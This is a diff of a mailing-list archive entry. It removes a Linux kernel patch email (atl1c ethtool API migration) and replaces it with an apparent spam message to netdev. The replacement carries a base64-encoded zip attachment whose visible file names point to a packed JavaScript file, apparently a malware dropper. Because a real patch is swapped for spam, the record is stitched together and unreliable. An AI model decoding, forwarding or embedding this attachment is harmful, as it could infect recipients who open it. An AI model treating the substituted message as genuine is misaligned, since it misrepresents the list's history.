@@ -1,144 +1,80 @@
-From: Philippe Reynes <tremyfr@gmail.com>
-Subject: [PATCH] net: atheros: atl1c: use new api ethtool_{get|set}_link_ksettings
-Date: Sat, 12 Nov 2016 17:32:49 +0100
-Message-ID: <1478968369-25034-1-git-send-email-tremyfr@gmail.com>
-Cc: netdev@vger.kernel.org, linux-kernel@vger.kernel.org,
-        Philippe Reynes <tremyfr@gmail.com>
-To: jcliburn@gmail.com, chris.snook@gmail.com, davem@davemloft.net
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+From: <clinicallaw@pepperdine.edu>
+Subject: 15405 netdev
+Date: Sat, 12 Nov 2016 17:09:46 -0000
+Message-ID: <147897058677.24433.11785057493899466131@vnpt.vn>
+Mime-Version: 1.0
+Content-Type: application/zip; name="MESSAGE_884059386788_netdev.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from static.vnpt.vn ([14.161.43.68]:49943 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S966413AbcKLRJy (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Sat, 12 Nov 2016 12:09:54 -0500
+Content-Disposition: attachment
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-The ethtool api {get|set}_settings is deprecated.
-We move this driver to new api {get|set}_link_ksettings.
-
-Signed-off-by: Philippe Reynes <tremyfr@gmail.com>
----
- drivers/net/ethernet/atheros/atl1c/atl1c_ethtool.c |   54 +++++++++++---------
- 1 files changed, 30 insertions(+), 24 deletions(-)
-
-diff --git a/drivers/net/ethernet/atheros/atl1c/atl1c_ethtool.c b/drivers/net/ethernet/atheros/atl1c/atl1c_ethtool.c
-index 872b7ab..cfe86a2 100644
---- a/drivers/net/ethernet/atheros/atl1c/atl1c_ethtool.c
-+++ b/drivers/net/ethernet/atheros/atl1c/atl1c_ethtool.c
-@@ -26,46 +26,52 @@
- 
- #include "atl1c.h"
- 
--static int atl1c_get_settings(struct net_device *netdev,
--			      struct ethtool_cmd *ecmd)
-+static int atl1c_get_link_ksettings(struct net_device *netdev,
-+				    struct ethtool_link_ksettings *cmd)
- {
- 	struct atl1c_adapter *adapter = netdev_priv(netdev);
- 	struct atl1c_hw *hw = &adapter->hw;
-+	u32 supported, advertising;
- 
--	ecmd->supported = (SUPPORTED_10baseT_Half  |
-+	supported = (SUPPORTED_10baseT_Half  |
- 			   SUPPORTED_10baseT_Full  |
- 			   SUPPORTED_100baseT_Half |
- 			   SUPPORTED_100baseT_Full |
- 			   SUPPORTED_Autoneg       |
- 			   SUPPORTED_TP);
- 	if (hw->link_cap_flags & ATL1C_LINK_CAP_1000M)
--		ecmd->supported |= SUPPORTED_1000baseT_Full;
-+		supported |= SUPPORTED_1000baseT_Full;
- 
--	ecmd->advertising = ADVERTISED_TP;
-+	advertising = ADVERTISED_TP;
- 
--	ecmd->advertising |= hw->autoneg_advertised;
-+	advertising |= hw->autoneg_advertised;
- 
--	ecmd->port = PORT_TP;
--	ecmd->phy_address = 0;
--	ecmd->transceiver = XCVR_INTERNAL;
-+	cmd->base.port = PORT_TP;
-+	cmd->base.phy_address = 0;
- 
- 	if (adapter->link_speed != SPEED_0) {
--		ethtool_cmd_speed_set(ecmd, adapter->link_speed);
-+		cmd->base.speed = adapter->link_speed;
- 		if (adapter->link_duplex == FULL_DUPLEX)
--			ecmd->duplex = DUPLEX_FULL;
-+			cmd->base.duplex = DUPLEX_FULL;
- 		else
--			ecmd->duplex = DUPLEX_HALF;
-+			cmd->base.duplex = DUPLEX_HALF;
- 	} else {
--		ethtool_cmd_speed_set(ecmd, SPEED_UNKNOWN);
--		ecmd->duplex = DUPLEX_UNKNOWN;
-+		cmd->base.speed = SPEED_UNKNOWN;
-+		cmd->base.duplex = DUPLEX_UNKNOWN;
- 	}
- 
--	ecmd->autoneg = AUTONEG_ENABLE;
-+	cmd->base.autoneg = AUTONEG_ENABLE;
-+
-+	ethtool_convert_legacy_u32_to_link_mode(cmd->link_modes.supported,
-+						supported);
-+	ethtool_convert_legacy_u32_to_link_mode(cmd->link_modes.advertising,
-+						advertising);
-+
- 	return 0;
- }
- 
--static int atl1c_set_settings(struct net_device *netdev,
--			      struct ethtool_cmd *ecmd)
-+static int atl1c_set_link_ksettings(struct net_device *netdev,
-+				    const struct ethtool_link_ksettings *cmd)
- {
- 	struct atl1c_adapter *adapter = netdev_priv(netdev);
- 	struct atl1c_hw *hw = &adapter->hw;
-@@ -74,12 +80,12 @@ static int atl1c_set_settings(struct net_device *netdev,
- 	while (test_and_set_bit(__AT_RESETTING, &adapter->flags))
- 		msleep(1);
- 
--	if (ecmd->autoneg == AUTONEG_ENABLE) {
-+	if (cmd->base.autoneg == AUTONEG_ENABLE) {
- 		autoneg_advertised = ADVERTISED_Autoneg;
- 	} else {
--		u32 speed = ethtool_cmd_speed(ecmd);
-+		u32 speed = cmd->base.speed;
- 		if (speed == SPEED_1000) {
--			if (ecmd->duplex != DUPLEX_FULL) {
-+			if (cmd->base.duplex != DUPLEX_FULL) {
- 				if (netif_msg_link(adapter))
- 					dev_warn(&adapter->pdev->dev,
- 						"1000M half is invalid\n");
-@@ -88,12 +94,12 @@ static int atl1c_set_settings(struct net_device *netdev,
- 			}
- 			autoneg_advertised = ADVERTISED_1000baseT_Full;
- 		} else if (speed == SPEED_100) {
--			if (ecmd->duplex == DUPLEX_FULL)
-+			if (cmd->base.duplex == DUPLEX_FULL)
- 				autoneg_advertised = ADVERTISED_100baseT_Full;
- 			else
- 				autoneg_advertised = ADVERTISED_100baseT_Half;
- 		} else {
--			if (ecmd->duplex == DUPLEX_FULL)
-+			if (cmd->base.duplex == DUPLEX_FULL)
- 				autoneg_advertised = ADVERTISED_10baseT_Full;
- 			else
- 				autoneg_advertised = ADVERTISED_10baseT_Half;
-@@ -284,8 +290,6 @@ static int atl1c_nway_reset(struct net_device *netdev)
- }
- 
- static const struct ethtool_ops atl1c_ethtool_ops = {
--	.get_settings           = atl1c_get_settings,
--	.set_settings           = atl1c_set_settings,
- 	.get_drvinfo            = atl1c_get_drvinfo,
- 	.get_regs_len           = atl1c_get_regs_len,
- 	.get_regs               = atl1c_get_regs,
-@@ -297,6 +301,8 @@ static int atl1c_nway_reset(struct net_device *netdev)
- 	.get_link               = ethtool_op_get_link,
- 	.get_eeprom_len         = atl1c_get_eeprom_len,
- 	.get_eeprom             = atl1c_get_eeprom,
-+	.get_link_ksettings     = atl1c_get_link_ksettings,
-+	.set_link_ksettings     = atl1c_set_link_ksettings,
- };
- 
- void atl1c_set_ethtool_ops(struct net_device *netdev)
--- 
-1.7.4.4
+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
